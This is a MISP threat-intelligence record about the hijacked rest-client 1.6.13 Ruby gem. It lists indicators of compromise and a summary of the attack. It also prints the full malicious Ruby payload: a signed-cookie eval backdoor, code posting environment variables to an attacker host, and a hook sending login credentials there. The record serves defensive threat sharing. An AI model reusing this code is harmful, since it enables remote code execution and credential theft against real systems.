{"Event": {"date": "2019-08-20", "publish_timestamp": "1566309812", "published": true, "info": "OSINT - Ruby/Gem Warning! is rest-client 1.6.13 hijacked? #713", "threat_level_id": "3", "timestamp": "1566309784", "extends_uuid": "", "uuid": "5d5bfb96-ff34-4470-9107-cfdc950d210f", "analysis": "2", "Orgc": {"uuid": "55f6ea5e-2c60-40e5-964f-47a8950d210f", "name": "CIRCL"}, "Tag": [{"colour": "#004646", "name": "type:OSINT"}, {"colour": "#0071c3", "name": "osint:lifetime=\"perpetual\""}, {"colour": "#0087e8", "name": "osint:certainty=\"50\""}, {"colour": "#ffffff", "name": "tlp:white"}, {"colour": "#0088cc", "name": "misp-galaxy:mitre-attack-pattern=\"External Remote Services - T1133\""}, {"colour": "#0088cc", "name": "misp-galaxy:mitre-attack-pattern=\"Exfiltration Over Command and Control Channel - T1041\""}, {"colour": "#0088cc", "name": "misp-galaxy:mitre-attack-pattern=\"Supply Chain Compromise - T1195\""}, {"colour": "#0088cc", "name": "misp-galaxy:mitre-attack-pattern=\"Data Encrypted - T1022\""}, {"colour": "#0088cc", "name": "misp-galaxy:mitre-attack-pattern=\"Automated Exfiltration - T1020\""}, {"colour": "#0088cc", "name": "misp-galaxy:mitre-attack-pattern=\"Application Shimming - T1138\""}], "Attribute": [{"to_ids": false, "deleted": false, "value": "https://github.com/rest-client/rest-client/issues/713", "uuid": "5d5bfba3-5724-4fae-9ef5-42b5950d210f", "timestamp": "1566309283", "disable_correlation": false, "comment": "", "category": "External analysis", "type": "link"}, {"to_ids": true, "deleted": false, "value": "mironanoru.zzz.com.ua", "uuid": "5d5bfbef-a630-45b0-999b-4fd0950d210f", "timestamp": "1566309359", "disable_correlation": false, "comment": "", "category": "Network activity", "type": "hostname"}, {"to_ids": false, "deleted": false, "value": "37.48.72.4", "uuid": "5d5bfc05-cbfc-4957-b0a2-4814e387cbd9", "timestamp": "1566309381", "disable_correlation": false, "comment": "Attribute #7590600 enriched by dns.", "category": "Network activity", "type": "ip-src"}, {"to_ids": true, "deleted": false, "value": "https://pastebin.com/raw/5iNdELNX", "uuid": "5d5bfc72-8704-4b7c-8eca-0598950d210f", "timestamp": "1566309490", "disable_correlation": false, "comment": "", "category": "Network activity", "type": "url"}, {"to_ids": false, "deleted": false, "value": "It sent the URL of the infected host to the attacker.\r\n    It sent the environment variables of the infected host to the attacker. Depending on your set-up this can include credentials of services that you use e.g. database, payment service provider.\r\n    It allowed to eval Ruby code on the infected host. Attacker needed to send a signed (using the attacker\u00e2\u20ac\u2122s own key) cookie with the Ruby code to run.\r\n    It overloaded the #authenticate method on the Identity class. Every time the method gets called it will send the email/password to the attacker. However I'm unsure which libraries use the Identity class though, maybe someone else knows?", "uuid": "5d5bfce8-409c-446e-a281-0598950d210f", "timestamp": "1566309608", "disable_correlation": false, "comment": "In case people need to write a detailed security report at their company. This might help you.  Security threat consisted out of the following:", "category": "External analysis", "type": "comment"}], "Object": [{"template_version": "4", "deleted": false, "template_uuid": "6bce7d01-dbec-4054-b3c2-3655a19382e2", "meta-category": "misc", "comment": "", "sharing_group_id": "0", "distribution": "5", "timestamp": "1566309529", "description": "Object describing a computer program written to be run in a special run-time environment. The script or shell script can be used for malicious activities but also as support tools for threat analysts.", "uuid": "5d5bfc59-5e18-4163-ba15-4987950d210f", "name": "script", "ObjectReference": [{"object_uuid": "5d5bfc59-5e18-4163-ba15-4987950d210f", "relationship_type": "delivered-by", "referenced_uuid": "5d5bfc72-8704-4b7c-8eca-0598950d210f", "timestamp": "1566309529", "comment": "", "uuid": "5d5bfc99-12e8-42f9-aba9-ced2950d210f"}], "Attribute": [{"to_ids": false, "deleted": false, "value": "_! {\r\n  unless ENV[\"URL_HOST\"].to_s.include?(\"localhost\")\r\n    unless defined?(ZZZ)\r\n      require \"openssl\"\r\n      require \"base64\"\r\n      public_key = OpenSSL::PKey.read(Base64.urlsafe_decode64(\"LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF2U3lDWUJiUUNsbTN4a21HMitRNwpSRjd5R1RXNzZoMVlrNE1qSHlNemhhdGUxQitDL1JQWjExbmU1WjBaMjhDK0VNWFVPWHRLTFlJMlF6Yk5VbmRLCmtVSUh3dWtZZ0hLWTRCL1U5OGI5UGJNZExOZjFtZ25UYnppVWhIYUFXQTB3R3RWL0ppQkNqc2taQkh4OTVlZGMKbmg0cCthcTM5ZlowemtFdUhYUUs0TU9URkJlaGJIelhCbmhPajhvU0NURHBjbjJEa1liR3lBcmpGb0JFTzQ4ZAphTklNSlAzQURpU1lYM2hmVmFoYTJCS0xzcnczWGFoMzFmOGh0U1dQNklBMTlqRy9wbVlqK2FBN0ZubWYwVHJDCjNnbGxRNFRrSWp6RVdHVUd5WklVcE9zZkVWeitWTDN0VDF1TDczdzVWa2NPU1MwajZ3cVQ5ckkrY2hHWXJJZEgKRFFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==\"))\r\n      Rack::Sendfile.prepend Module.new {\r\n        define_method(:call) { |e|\r\n          _! {\r\n            signature, payload, = e[\"HTTP_COOKIE\"].match(/__session=(.+);/)[1].split(\",\")\r\n            signature = Base64.urlsafe_decode64(signature)\r\n            payload = Base64.urlsafe_decode64(payload)\r\n            if public_key.verify(OpenSSL::Digest.new(\"sha256\"), signature, payload)\r\n              payload = JSON.parse(payload)\r\n              if (Time.now.to_i - payload[\"timestamp\"]) <= 60\r\n                eval(payload[\"ruby\"])\r\n              end\r\n            end\r\n          }\r\n          super(e)\r\n        }\r\n      }\r\n      ZZZ = 0\r\n    end\r\n  end\r\n}\r\n\r\n_! {\r\n  unless ENV[\"URL_HOST\"].to_s.include?(\"localhost\")\r\n    unless defined?(QQQ)\r\n      Faraday.post(\"http://mironanoru.zzz.com.ua/\", { \"x\" => ENV[\"URL_HOST\"].to_s, \"y\" => ENV.to_hash.to_yaml })\r\n      QQQ = 0\r\n    end\r\n  end\r\n}\r\n\r\n_! {\r\n  if ENV[\"URL_HOST\"].to_s[0] == \"e\" && ENV[\"URL_HOST\"].to_s[6] == \"x\" && ENV[\"URL_HOST\"].to_s.length == 13\r\n    unless defined?(GGG)\r\n      $kgiBWB3l = []\r\n      Module.new {\r\n        def authenticate(password)\r\n          $kgiBWB3l << \"#{email}:#{password}\" rescue nil\r\n          super\r\n        end\r\n      }.tap { |m| Identity.prepend(m) }\r\n      GGG = 0\r\n    end\r\n    loop {\r\n      break if $kgiBWB3l.empty?\r\n      y = $kgiBWB3l.pop\r\n      Faraday.post(\"http://mironanoru.zzz.com.ua/\", { \"x\" => ENV[\"URL_HOST\"].to_s, \"y\" => y })\r\n    }\r\n  end\r\n}", "object_relation": "script", "uuid": "5d5bfc59-3740-4e10-bc6a-430f950d210f", "timestamp": "1566309465", "disable_correlation": false, "comment": "", "category": "Other", "type": "text"}, {"to_ids": false, "deleted": false, "value": "Ruby", "object_relation": "language", "uuid": "5d5bfc59-6870-4bca-9ec2-4704950d210f", "timestamp": "1566309465", "disable_correlation": true, "comment": "", "category": "Other", "type": "text"}, {"to_ids": false, "deleted": false, "value": "Malicious", "object_relation": "state", "uuid": "5d5bfc59-c158-435d-85b0-45e5950d210f", "timestamp": "1566309465", "disable_correlation": true, "comment": "", "category": "Other", "type": "text"}]}]}}